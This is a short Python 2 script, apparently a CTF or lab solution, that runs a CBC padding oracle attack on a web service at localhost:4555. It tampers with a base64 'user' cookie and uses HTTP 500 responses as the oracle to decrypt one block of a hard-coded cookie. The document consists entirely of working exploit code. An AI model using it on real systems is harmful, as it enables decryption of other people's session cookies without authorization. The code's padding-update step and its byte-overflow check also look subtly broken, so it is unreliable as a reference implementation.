#!/usr/bin/env python

import requests
import base64

URL = 'http://localhost:4555'
padding = bytearray([15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 16])

def test(cookie):
    encode = base64.b64encode(cookie)

    r = requests.get(URL, cookies={'user': encode})

    return r.status_code != 500

def decryptByte(cookie):
    original = bytearray(cookie[:16])
    cookie = bytearray(cookie[16:])
    iv = bytearray(16)

    for i in range(15, -1, -1):
        #cycle through to get next value
        while not test(iv + cookie):
            iv[i] += 1
            if iv[i] > 255:
                print "This should not have happened"

        #undo padding on last byte
        iv[15] = iv[15] ^ (16 - i)
        #apply new padding on last byte
        iv[15] = iv[15] ^ (16 - i + 1)


    intermediate = bytearray(16)
    for i in range(16):
        intermediate[i] = iv[i] ^ padding[i]


    plaintext = bytearray(16)
    for i in range(16):
        plaintext[i] = intermediate[i] ^ original[i]

    print ''.join(chr(x) for x in plaintext)

    return plaintext




def main():
    dummy = "k0UtzN9gwc1qfe2CMYn3rESGL6mJwyG8Z+ztkAJJBVM="
    cookie =  base64.b64decode(dummy)

    plaintext = decryptByte(cookie)
    # print (bytearray(plaintext))

if __name__ == '__main__':
    main()